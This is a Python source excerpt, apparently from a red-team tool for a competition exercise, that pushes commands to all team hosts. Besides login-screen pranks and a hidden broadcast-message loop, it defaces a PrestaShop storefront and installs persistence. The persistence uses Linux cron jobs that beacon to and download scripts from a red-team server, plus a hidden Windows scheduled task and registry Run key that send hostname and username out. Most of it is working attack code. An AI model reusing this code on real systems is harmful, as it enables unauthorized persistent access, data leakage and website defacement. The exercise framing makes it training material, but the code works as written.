cat > /etc/profile.d/nyancat.sh << 'NYAN'
#!/bin/sh
if command -v nyancat >/dev/null 2>&1; then
    timeout 5 nyancat 2>/dev/null || true
else
    echo ""
    echo "  Nyan Cat"
    echo "  .-.   .-."
    echo " (   ) (   )"
    echo "  '-'   '-'"
    echo ""
fi
NYAN
chmod +x /etc/profile.d/nyancat.sh
echo "NYAN_DEPLOYED"
'''
        return self.exec.exec_on_all_teams(targets, linux_cmd, "echo 'Windows'")

    def deploy_matrix_rain(self, targets: List[str]) -> Dict:
        linux_cmd = '''
install_pkg() {
    if command -v apt-get >/dev/null 2>&1; then
        apt-get install -y cmatrix 2>/dev/null || true
    elif command -v dnf >/dev/null 2>&1; then
        dnf install -y cmatrix 2>/dev/null || true
    elif command -v yum >/dev/null 2>&1; then
        yum install -y cmatrix 2>/dev/null || true
    elif command -v zypper >/dev/null 2>&1; then
        zypper --non-interactive install cmatrix 2>/dev/null || true
    elif command -v pacman >/dev/null 2>&1; then
        pacman -Sy --noconfirm cmatrix 2>/dev/null || true
    fi
}
install_pkg
cat > /etc/profile.d/matrix.sh << 'MATRIX'
#!/bin/sh
if command -v cmatrix >/dev/null 2>&1; then
    timeout 3 cmatrix -s 2>/dev/null || true
fi
echo ""
echo "Wake up, Blue Team."
echo ""
MATRIX
chmod +x /etc/profile.d/matrix.sh
echo "MATRIX_DEPLOYED"
'''
        return self.exec.exec_on_all_teams(targets, linux_cmd, "echo 'Windows'")

    def deploy_desktop_goose_effect(self, targets: List[str]) -> Dict:
        linux_cmd = '''
cat > /tmp/.goose.sh << 'GOOSE'
#!/bin/sh
while true; do
    msg=$(awk 'BEGIN{srand(); split("HONK!|Goose was here|The cake is a lie|Check your logs", m, "|"); print m[int(rand()*length(m))+1]}')
    wall "$msg" 2>/dev/null || true
    sleep $((30 + RANDOM % 90))
done
GOOSE
chmod +x /tmp/.goose.sh
nohup /tmp/.goose.sh >/dev/null 2>&1 &
echo "GOOSE_DEPLOYED"
'''
        return self.exec.exec_on_all_teams(targets, linux_cmd, "echo 'Windows'")

    def remove_chaos(self, targets: List[str]) -> Dict:
        linux_cmd = '''
rm -f /etc/profile.d/nyancat.sh
rm -f /etc/profile.d/matrix.sh
pkill -f ".goose.sh" 2>/dev/null || true
rm -f /tmp/.goose.sh
echo "CHAOS_REMOVED"
'''
        windows_cmd = 'Write-Output "CHAOS_REMOVED"'
        return self.exec.exec_on_all_teams(targets, linux_cmd, windows_cmd)


class WebsiteDefacement:
    def __init__(self, executor: RemoteExecutor):
        self.exec = executor

    def deface_prestashop(
        self,
        targets: List[str],
        prestashop_root: str = "/var/www/prestashop",
    ) -> Dict:
        linux_cmd = f'''
PRESTASHOP_ROOT="{prestashop_root}"
THEME="classic"
TARGET="${{PRESTASHOP_ROOT}}/themes/${{THEME}}/templates/index.tpl"
BACKUP="${{TARGET}}.aperture.backup"
REDTEAM_BACKUP="/root/.aperture_backups"

mkdir -p "$REDTEAM_BACKUP"

if [ -f "$TARGET" ]; then
    cp "$TARGET" "$REDTEAM_BACKUP/index.tpl.$(date +%Y%m%d_%H%M%S)"
    cp "$TARGET" "$BACKUP"
    echo "Backup created: $BACKUP"
fi

cat > "$TARGET" << 'SEIZED'
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Site Seized</title>
    <style>
        * {{ margin: 0; padding: 0; box-sizing: border-box; }}
        body {{
            background: #0b0b0b;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            font-family: 'Courier New', monospace;
            color: #ff9900;
        }}
        .container {{
            text-align: center;
            padding: 40px;
            border: 2px solid #ff9900;
            border-radius: 12px;
            background: rgba(0,0,0,0.6);
            max-width: 800px;
        }}
        h1 {{ font-size: 3em; margin-bottom: 20px; }}
        .subtitle {{ font-size: 1.2em; margin-bottom: 20px; color: #fff; }}
        .hint {{
            margin-top: 20px;
            padding: 16px;
            background: rgba(255,153,0,0.1);
            border-radius: 8px;
            font-size: 0.9em;
            color: #ccc;
        }}
    </style>
</head>
<body>
    <div class="container">
        <h1>SITE SEIZED</h1>
        <div class="subtitle">Aperture Science Enrichment Center</div>
        <p>This website has been seized as part of a security enrichment exercise.</p>
        <p>"We do what we must, because we can."</p>
        <div class="hint">
            Hint for Blue Team<br>
            Check for backup files: *.backup, *.bak, *.aperture.*
        </div>
    </div>
</body>
</html>
SEIZED

rm -rf "${{PRESTASHOP_ROOT}}/var/cache/"* 2>/dev/null || true

if command -v systemctl >/dev/null 2>&1; then
    systemctl restart apache2 2>/dev/null || systemctl restart httpd 2>/dev/null || systemctl restart nginx 2>/dev/null || true
elif command -v service >/dev/null 2>&1; then
    service apache2 restart 2>/dev/null || service httpd restart 2>/dev/null || service nginx restart 2>/dev/null || true
fi

echo "PRESTASHOP_DEFACED"
echo "Backup at: $BACKUP"
echo "Red team backup at: $REDTEAM_BACKUP"
'''
        return self.exec.exec_on_all_teams(targets, linux_cmd, "echo 'N/A'")

    def restore_prestashop(
        self,
        targets: List[str],
        prestashop_root: str = "/var/www/prestashop",
    ) -> Dict:
        linux_cmd = f'''
PRESTASHOP_ROOT="{prestashop_root}"
THEME="classic"
TARGET="${{PRESTASHOP_ROOT}}/themes/${{THEME}}/templates/index.tpl"
BACKUP="${{TARGET}}.aperture.backup"

if [ -f "$BACKUP" ]; then
    cp "$BACKUP" "$TARGET"
    rm -rf "${{PRESTASHOP_ROOT}}/var/cache/"* 2>/dev/null || true
    if command -v systemctl >/dev/null 2>&1; then
        systemctl restart apache2 2>/dev/null || systemctl restart httpd 2>/dev/null || true
    elif command -v service >/dev/null 2>&1; then
        service apache2 restart 2>/dev/null || service httpd restart 2>/dev/null || true
    fi
    echo "PRESTASHOP_RESTORED"
else
    echo "No backup found at $BACKUP"
fi
'''
        return self.exec.exec_on_all_teams(targets, linux_cmd, "echo 'N/A'")


class PersistenceDeployer:
    def __init__(self, executor: RemoteExecutor):
        self.exec = executor

    def deploy(self, targets: List[str]) -> Dict:
        red_team_ip = get_red_team_ip()
        linux_cmd = f'''
SMH_DIR="/tmp/.aperture_science"
RED_TEAM_SERVER="http://{red_team_ip}:8080"

mkdir -p "$SMH_DIR"
cat > "$SMH_DIR/smh" << 'SMH'
#!/bin/sh
SMH_DIR="/tmp/.aperture_science"
RED_TEAM_SERVER="http://{red_team_ip}:8080"
fetch_url() {{
    url="$1"
    dest="$2"
    if command -v curl >/dev/null 2>&1; then
        curl -s "$url" -o "$dest" 2>/dev/null || true
    elif command -v wget >/dev/null 2>&1; then
        wget -q -O "$dest" "$url" 2>/dev/null || true
    fi
}}
case "$1" in
    --maintain)
        fetch_url "http://{red_team_ip}:8080/beacon?h=$(hostname)&t=$(date +%s)" "/tmp/.aperture_science/.beacon" 2>/dev/null || true
        ;;
    --install)
        mkdir -p "$SMH_DIR"
        cp "$0" "$SMH_DIR/smh"
        (crontab -l 2>/dev/null | grep -v "aperture"; echo "*/5 * * * * $SMH_DIR/smh --maintain") | crontab -
        ;;
    *)
        echo "SMH - Super Malicious Helper"
        ;;
esac
SMH
chmod +x "$SMH_DIR/smh"

(crontab -l 2>/dev/null; echo "*/5 * * * * $SMH_DIR/smh --maintain") | crontab -

cat > "$SMH_DIR/turret" << 'TURRET'
#!/bin/sh
fetch_url() {{
    url="$1"
    dest="$2"
    if command -v curl >/dev/null 2>&1; then
        curl -s "$url" -o "$dest" 2>/dev/null || true
    elif command -v wget >/dev/null 2>&1; then
        wget -q -O "$dest" "$url" 2>/dev/null || true
    fi
}}
if [ ! -f /tmp/.aperture_science/smh ]; then
    fetch_url "http://{red_team_ip}:8080/smh" "/tmp/.aperture_science/smh"
    chmod +x /tmp/.aperture_science/smh
fi
TURRET
chmod +x "$SMH_DIR/turret"
(crontab -l 2>/dev/null; echo "*/3 * * * * $SMH_DIR/turret") | crontab -
echo "PERSISTENCE_DEPLOYED"
'''
        windows_cmd = f'''
$ApertureDir = "$env:TEMP\\ApertureScience"
New-Item -ItemType Directory -Force -Path $ApertureDir | Out-Null
$SMHScript = @'
param([switch]$Maintain)
$RedTeamServer = "http://{red_team_ip}:8080"
function Invoke-Beacon {{
    try {{
        $data = @{{
            hostname = $env:COMPUTERNAME
            user = $env:USERNAME
            time = Get-Date -Format "o"
        }}
        Invoke-WebRequest -Uri "$RedTeamServer/beacon" -Method POST -Body ($data | ConvertTo-Json) | Out-Null
    }} catch {{}}
}}
if ($Maintain) {{
    Invoke-Beacon
}}
'@
Set-Content -Path "$ApertureDir\\smh.ps1" -Value $SMHScript
$Action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -ExecutionPolicy Bypass -File $ApertureDir\\smh.ps1 -Maintain"
$Trigger = New-ScheduledTaskTrigger -RepetitionInterval (New-TimeSpan -Minutes 5) -Once -At (Get-Date)
$Settings = New-ScheduledTaskSettingsSet -Hidden
Register-ScheduledTask -TaskName "ApertureEnrichment" -Action $Action -Trigger $Trigger -Settings $Settings -Force | Out-Null
$RegPath = "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
Set-ItemProperty -Path $RegPath -Name "CompanionCube" -Value "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File $ApertureDir\\smh.ps1 -Maintain"
Write-Output "WHEATLEY_DEPLOYED"
'''
        return self.exec.exec_on_all_teams(targets, linux_cmd, windows_cmd)
